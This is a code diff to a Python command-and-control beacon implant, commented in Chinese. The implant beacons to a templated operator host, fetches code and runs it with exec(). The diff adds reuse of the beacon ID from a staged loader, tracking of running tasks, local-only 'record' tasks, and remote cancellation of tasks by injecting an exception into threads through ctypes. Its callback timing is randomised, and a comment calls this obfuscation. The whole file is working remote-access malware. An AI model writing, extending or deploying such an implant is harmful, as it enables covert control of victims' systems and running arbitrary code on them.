@@ -5,7 +5,10 @@ HOST = "{{HOST}}"
 PORT = {{PORT}}
 INTERVAL = {{INTERVAL}}
 JITTER = {{JITTER}}
-BEACON_ID = sec.token_hex(8)
+# 分段载荷(agent_stager)同 id 语义: 引导代码已把 id 存入全局 BEACON_ID 时
+# 直接复用(否则 server 视新 id 为新 beacon, 会再次下发 stage 第二段, 二次
+# exec 清空 _KNOWN/_PENDING/_ACTIVE 状态 + 泄漏线程, 2026-08-27 修复)
+BEACON_ID = globals().get("BEACON_ID") or sec.token_hex(8)
 BREAK_FLAG = False
 CONN_KEY = MASTER_KEY
 
@@ -133,30 +136,74 @@ _PENDING = {}        # task_id -> {"output": str, "error": str}(已完成、未�
 _PENDING_LOCK = thr.Lock()
 _KNOWN = set()       # 已领取的 task_id(HTTPS/DNS 无状态通道可能重复下发,防重复执行)
 _KNOWN_LOCK = thr.Lock()
+_ACTIVE = {}         # task_id -> 线程(正在执行的任务,含持久任务;register 上报 running)
+_ACTIVE_LOCK = thr.Lock()
+_RECORDS = {}        # task_id -> {"output","error","ts"}(record 型任务: 只记录不上报)
+_RECORDS_LOCK = thr.Lock()
 
-def _run_one_task(task_id, code):
+class _TaskCancelled(BaseException):
+    """任务被 stop 命令取消的标记异常(继承 BaseException,避免被任务代码的
+    except Exception 吞掉;KeyboardInterrupt 会触发解释器 SIGINT 状态污染退出码)。"""
+    pass
+
+def _run_one_task(task_id, code, record=False):
     out_buf, err_buf = io_.StringIO(), io_.StringIO()
     _TLS.buf = (out_buf, err_buf)
     try:
         exec(code, globals())
+    except _TaskCancelled:
+        # 被 stop 命令取消: 静默退出, 不产生结果(线程结束由 finally 清 _ACTIVE)
+        return
     except Exception:
         err_buf.write(tb.format_exc())
     finally:
         _TLS.buf = None
+        with _ACTIVE_LOCK:
+            _ACTIVE.pop(task_id, None)   # 执行结束(含被取消)移出运行中
     out, err = out_buf.getvalue(), err_buf.getvalue()
     if len(out) > _TLS_MAX_OUT:
         out = out[: _TLS_MAX_OUT] + "\n... (truncated, %d bytes total)" % len(out)
+    if record:
+        # record 型任务: 只记录本地(不上报), record 模块可查
+        with _RECORDS_LOCK:
+            _RECORDS[task_id] = {"output": out, "error": err, "ts": tm.time()}
+        return
     with _PENDING_LOCK:
         _PENDING[task_id] = {"output": out, "error": err}
 
-def spawn_task(task_id, code):
+def spawn_task(task_id, code, record=False):
     if not task_id:
         return
     with _KNOWN_LOCK:
         if task_id in _KNOWN:
             return  # 已领取过(重复下发),跳过
         _KNOWN.add(task_id)
-    thr.Thread(target=_run_one_task, args=(task_id, code), daemon=True).start()
+    th = thr.Thread(target=_run_one_task, args=(task_id, code, record), daemon=True)
+    with _ACTIVE_LOCK:
+        _ACTIVE[task_id] = th
+    th.start()
+
+def _cancel_task(task_id):
+    """终止指定运行中任务: 向任务线程异步抛 KeyboardInterrupt。
+
+    Python 线程无法强制 kill,用 ctypes SetAsyncExc 在目标线程的字节码
+    边界抛异常——`while True: pass` 类死循环可被打断;任务代码若全捕获
+    BaseException 则无效(罕见)。阻塞在 socket.recv 的线程延迟到 IO 返回。
+    被取消的任务线程退出时 _run_one_task 的 finally 清 _ACTIVE,不产生结果。
+    """
+    with _ACTIVE_LOCK:
+        th = _ACTIVE.get(task_id)
+    if th is None or not th.is_alive():
+        return False
+    try:
+        import ctypes as _ct
+        # 注意: SetAsyncExc 第二参必须传"异常类"(type), 传实例会报
+        # SystemError: _PyErr_SetObject: exception ... is not a BaseException subclass
+        _ct.pythonapi.PyThreadState_SetAsyncExc(
+            _ct.c_long(th.ident), _ct.py_object(_TaskCancelled))
+        return True
+    except Exception:
+        return False
 
 def _handle_tasks(msg):
     """处理 TASKS 帧: acked 清理已确认结果 + tasks 去重领取。"""
@@ -164,7 +211,11 @@ def _handle_tasks(msg):
         with _PENDING_LOCK:
             _PENDING.pop(tid, None)
     for t in msg.get("tasks") or []:
-        spawn_task(t.get("task_id", ""), t.get("code", ""))
+        code = t.get("code", "")
+        if code.startswith("!cancel "):
+            _cancel_task(code[8:].strip())   # 任务终止指令(server stop 命令下发)
+            continue
+        spawn_task(t.get("task_id", ""), code, bool(t.get("record", False)))
 
 def sleep_jitter():
     # 回连间隔(混淆): [0.75I, 1.5I] 均匀随机,无最短下限(原 max(5,±) 有周期下界)
@@ -176,7 +227,8 @@ def cycle():
     try:
         conn = _T()          # 可能更新 _CK(_disp 连接成功设置层密钥)
         CONN_KEY = _CK       # 直连=_K(set_key 生效);uplevel 后=当前通道层密钥
-        send_frame(conn, js.dumps({"type": "register", "version": 2, "role": "beacon", "id": BEACON_ID, "batch": True}).encode())
+        send_frame(conn, js.dumps({"type": "register", "version": 2, "role": "beacon", "id": BEACON_ID, "batch": True,
+                                   "running": sorted(_ACTIVE)}).encode())
         while True:
             msg = js.loads(recv_frame(conn).decode())
             mtype = msg.get("type")
